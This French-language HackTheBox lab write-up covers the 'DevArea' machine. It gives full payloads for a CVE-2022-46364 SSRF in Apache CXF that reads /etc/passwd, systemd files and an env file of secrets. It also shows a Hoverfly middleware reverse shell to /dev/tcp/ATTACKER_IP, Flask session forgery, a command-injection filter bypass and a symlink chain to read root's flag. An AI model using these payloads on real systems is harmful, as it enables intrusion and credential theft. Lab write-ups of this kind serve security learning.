---
title: "HackTheBox - DevArea"
date: 2026-03-28 22:49:00 +0200
categories: [HackTheBox, Challenge, Medium]
tags: [ssrf, soap, apache-cxf, cve-2022-46364, xop-include, mtom, hoverfly, proxy, middleware, rce, flask, command-injection, symlink, privesc]
description: "Write-up de la machine DevArea — Exploitation d'un service SOAP Apache CXF 3.2.14 via CVE-2022-46364 (SSRF XOP:Include/MTOM) pour lire les fichiers système, récupération des credentials Hoverfly, RCE via middleware Hoverfly, puis escalade via command injection dans une web app Flask SysWatch et abus de symlinks pour lire le root flag."
image:
  path: /assets/img/posts/devarea/devarea.png
  alt: "HackTheBox - DevArea"
---

## Informations sur la machine

| Propriété      | Valeur       |
| -------------- | ------------ |
| **OS**         | Linux        |
| **Difficulté** | Medium       |
| **IP**         | 10.129.22.72 |
| **Domaines**   | devarea.htb  |

---

## Outils utilisés

| Outil                   | Rôle                                                |
| ----------------------- | --------------------------------------------------- |
| **nmap**                | Scan de ports et détection de services              |
| **ffuf**                | Fuzzing de répertoires et vhosts                    |
| **curl**                | Interaction avec les services SOAP, Hoverfly, Flask |
| **unzip / javap / cfr** | Décompilation du JAR Java                           |
| **flask-unsign**        | Forge de cookies de session Flask                   |
| **nc**                  | Listener pour reverse shell                         |

---

## Reconnaissance

### Scan initial

```bash
nmap -sV -sC 10.129.22.72
```

Six ports ouverts :
- **21** (FTP vsftpd 3.0.5) — login anonyme autorisé
- **22** (SSH OpenSSH 9.6p1)
- **80** (HTTP Apache 2.4.58) — site vitrine "DevArea"
- **8080** (HTTP Jetty 9.4.27) — retourne 404
- **8500** (HTTP Go) — proxy Hoverfly (auth requise)
- **8888** (HTTP Go) — dashboard Hoverfly

### FTP anonyme

```bash
ftp 10.129.22.72
# Login: anonymous / (vide)
cd pub
get employee-service.jar
```

Récupération d'un fichier `employee-service.jar` — une application Java.

### Analyse du JAR

Décompression et identification du package principal via le `MANIFEST.MF` :

```bash
unzip employee-service.jar -d employee-service
cat META-INF/MANIFEST.MF
# Main-Class: htb.devarea.ServerStarter
```

Décompilation des classes métier avec CFR :

```bash
java -jar cfr.jar htb/devarea/ServerStarter.class
java -jar cfr.jar htb/devarea/EmployeeServiceImpl.class
```

Le `ServerStarter` révèle l'endpoint SOAP :

```java
factory.setAddress("http://0.0.0.0:8080/employeeservice");
```

Le `pom.xml` indique **Apache CXF 3.2.14** avec la dépendance `cxf-rt-databinding-aegis`.

### WSDL et test du service SOAP

```bash
curl http://10.129.22.72:8080/employeeservice?wsdl
```

Le WSDL expose l'opération `submitReport` avec les champs `employeeName`, `department`, `content`, `confidential`. Test fonctionnel confirmé — le service reflète les inputs dans la réponse.

---

## Foothold — SSRF via CVE-2022-46364

### Identification de la vulnérabilité

Apache CXF 3.2.14 est vulnérable au **CVE-2022-46364** — une SSRF via l'attribut `href` de `XOP:Include` dans les requêtes MTOM. Cette vulnérabilité permet de faire des requêtes côté serveur (fichiers locaux ou HTTP internes) depuis le service SOAP.

### Exploitation — Lecture de fichiers

Requête MTOM avec `XOP:Include` pointant vers `file:///etc/passwd` :

```bash
curl -s -X POST http://10.129.22.72:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root.message>"; start-info="text/xml"; boundary="uuid:boundary123"' \
  -d '--uuid:boundary123
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://devarea.htb/">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>
        <department>IT</department>
        <content>test</content>
        <confidential>false</confidential>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>
--uuid:boundary123--'
```

Le contenu du fichier est retourné en **base64** dans le champ `employeeName` de la réponse SOAP. Décodage :

```bash
echo '<base64>' | base64 -d
```

Utilisateur avec shell identifié : `dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash`

### Lecture du service systemd Hoverfly

```bash
# SSRF vers file:///etc/systemd/system/hoverfly.service
```

Résultat décodé :

```ini
[Service]
User=dev_ryan
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
```

Credentials Hoverfly : **`admin:O7IJ27MyyXiU`**

### Authentification au dashboard Hoverfly

```bash
curl -X POST http://10.129.22.72:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}'
```

Token JWT obtenu pour l'API admin de Hoverfly.

### RCE via middleware Hoverfly

Hoverfly permet de configurer un **middleware** — un script exécuté pour chaque requête passant par le proxy. Configuration d'un reverse shell Python :

```bash
TOKEN="<jwt_token>"

# Configuration du middleware
curl -s -X PUT http://10.129.22.72:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"binary":"python3","script":"import subprocess,socket,os,json,sys\ndata=json.loads(sys.stdin.read())\nos.system(\"bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1'\''\")\nprint(json.dumps(data))"}'
```

Déclenchement via une requête au proxy :

```bash
# Listener
nc -lvnp 9001

# Trigger
curl -x http://10.129.22.72:8500 --proxy-user admin:O7IJ27MyyXiU http://anything.com
```

Shell obtenu en tant que **dev_ryan**.

---

## Énumération en tant que dev_ryan

### Flag user

```bash
cat /home/dev_ryan/user.txt
```

### Sudo

```bash
sudo -l
```

```
(root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

Le script `syswatch.sh` est exécutable en root, mais les commandes `web-stop` et `web-restart` sont interdites.

### Analyse de SysWatch

Un fichier `syswatch-v1.zip` dans le home de `dev_ryan` contient le code source complet de l'application SysWatch, incluant un script bash (`syswatch.sh`) et une web app Flask (`app.py`).

---

## Privilege Escalation — dev_ryan → root

### Étape 1 : Lecture de la configuration SysWatch

Via la SSRF, lecture du service systemd du web GUI :

```bash
# SSRF vers file:///etc/systemd/system/syswatch-web.service
```

Le service référence `EnvironmentFile=/etc/syswatch.env`. Lecture de ce fichier :

```bash
# SSRF vers file:///etc/syswatch.env
```

```
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
```

### Étape 2 : Forge de cookie Flask

Le web GUI Flask (`127.0.0.1:7777`) tourne en tant que `syswatch`. Avec la secret key, forge d'un cookie de session admin :

```bash
flask-unsign --sign --cookie '{"user_id":1,"username":"admin"}' \
  --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725'
```

### Étape 3 : Command injection dans le web GUI

Le endpoint `/service-status` de Flask utilise `subprocess.run` avec `shell=True` :

```python
res = subprocess.run([f"systemctl status --no-pager {service}"], shell=True, ...)
```

Le filtre regex `r"^[^;/\&.<>\rA-Z]*$"` bloque `;`, `/`, `&`, `.`, `<`, `>`, `\r` et les majuscules, mais le pipe `|`, `$()`, les newlines, et les minuscules passent.

Test de la command injection (en tant que `syswatch`) :

```bash
curl -s -b "session=<forged_cookie>" \
  --data-urlencode 'service=test|id' \
  http://127.0.0.1:7777/service-status
# uid=984(syswatch) gid=984(syswatch)
```

Pour contourner l'interdiction du `/` dans l'input, utilisation de `$(pwd|cut -c1)` qui retourne `/` à partir du working directory.

### Étape 4 : Création de symlinks via command injection

Le script `syswatch.sh` exécuté en root via `sudo` a une commande `logs` qui lit des fichiers dans `/opt/syswatch/logs/`. La fonction `view_logs` suit les symlinks avec une validation : si un symlink `a` pointe vers `b` (nom simple sans `/`), elle fait `cat /opt/syswatch/logs/b`. Si `b` est lui-même un symlink vers `/root/root.txt`, le kernel suit la chaîne.

Création d'un script helper (en tant que `dev_ryan`) :

```bash
echo '#!/bin/bash' > /tmp/fix
echo 'rm -f /opt/syswatch/logs/a /opt/syswatch/logs/b' >> /tmp/fix
echo 'ln -sf /root/root.txt /opt/syswatch/logs/b' >> /tmp/fix
echo 'ln -sf b /opt/syswatch/logs/a' >> /tmp/fix
chmod 777 /tmp/fix
```

Exécution du script via la command injection (en tant que `syswatch`, qui a accès au dossier logs) :

```bash
curl -s -b "session=<forged_cookie>" \
  --data-urlencode 'service=test|bash $(pwd|cut -c1)tmp$(pwd|cut -c1)fix' \
  http://127.0.0.1:7777/service-status
```

### Étape 5 : Lecture du root flag

```bash
sudo /opt/syswatch/syswatch.sh logs a
# -> suit a -> b -> /root/root.txt
```

Root flag obtenu.

---

## Flags

```bash
cat /home/dev_ryan/user.txt
sudo /opt/syswatch/syswatch.sh logs a  # via symlink chain
```

---

## Récapitulatif de la chaîne d'exploitation

```
devarea.htb (site vitrine)
  │
  ├─ FTP anonyme → employee-service.jar
  │   └─ Décompilation → Apache CXF 3.2.14 + endpoint SOAP
  │
  └─ Port 8080 — SOAP EmployeeService
      │
      └─ CVE-2022-46364 (SSRF via XOP:Include/MTOM)
          │
          ├─ file:///etc/passwd → user dev_ryan
          ├─ file:///etc/systemd/system/hoverfly.service → creds admin:O7IJ27MyyXiU
          ├─ file:///etc/systemd/system/syswatch-web.service → EnvironmentFile
          └─ file:///etc/syswatch.env → Flask secret key + admin password
              │
              └─ Port 8888 — Hoverfly Dashboard
                  │
                  └─ API token-auth → JWT
                      └─ PUT middleware → reverse shell Python
                          └─ RCE → shell dev_ryan
                              │
                              ├─ user.txt ✓
                              │
                              └─ flask-unsign → forge cookie session admin
                                  └─ Port 7777 — SysWatch Web GUI (syswatch)
                                      │
                                      └─ /service-status command injection (shell=True)
                                          │  (bypass regex: | et $() autorisés, / via $(pwd|cut -c1))
                                          │
                                          └─ Création symlinks dans /opt/syswatch/logs/
                                              │  a -> b, b -> /root/root.txt
                                              │
                                              └─ sudo syswatch.sh logs a
                                                  └─ cat suit la chaîne de symlinks
                                                      └─ root.txt ✓
```

---

## Ressources

- [CVE-2022-46364 — Apache CXF SSRF via XOP:Include](https://cxf.apache.org/security-advisories.data/CVE-2022-46364.txt)
- [Hoverfly Documentation — Middleware](https://docs.hoverfly.io/en/latest/pages/keyconcepts/middleware.html)
- [Flask Session Cookie Forgery — flask-unsign](https://github.com/Paradoxis/Flask-Unsign)

---

## Leçons apprises

- **Les fichiers JAR sur FTP sont une mine d'or** — la décompilation révèle les endpoints, les versions de frameworks, et les dépendances vulnérables. Le `pom.xml` embarqué donne directement les versions exactes pour chercher des CVE.
- **Apache CXF + MTOM = SSRF** — les versions anciennes de CXF ne valident pas l'attribut `href` de `XOP:Include`, permettant de lire des fichiers locaux ou d'atteindre des services internes. Le contenu est retourné encodé en base64 dans la réponse SOAP.
- **Les services systemd contiennent souvent des secrets** — les fichiers `.service` et les `EnvironmentFile` référencés sont des cibles prioritaires pour la lecture de credentials via SSRF/LFI.
- **Hoverfly middleware = RCE** — la fonctionnalité de middleware de Hoverfly exécute du code arbitraire sur le serveur pour chaque requête transitant par le proxy. Une fois authentifié à l'API admin, c'est un vecteur de RCE direct.
- **`shell=True` avec input utilisateur est toujours exploitable** — même avec un regex restrictif, les caractères comme `|`, `$()`, et les newlines permettent souvent de contourner les filtres. La construction de `/` à partir de variables d'environnement (`$(pwd|cut -c1)`) est une technique classique de bypass.
- **Les chaînes de symlinks contournent les validations naïves** — `view_logs` vérifie si le target d'un symlink est "sûr" (pas de `/`), mais ne vérifie pas si le fichier résolu est lui-même un symlink. Le double symlink `a -> b -> /root/root.txt` passe la validation sur `a` et le kernel résout `b` transparemment.

**Machine complétée**

{% include comments.html %}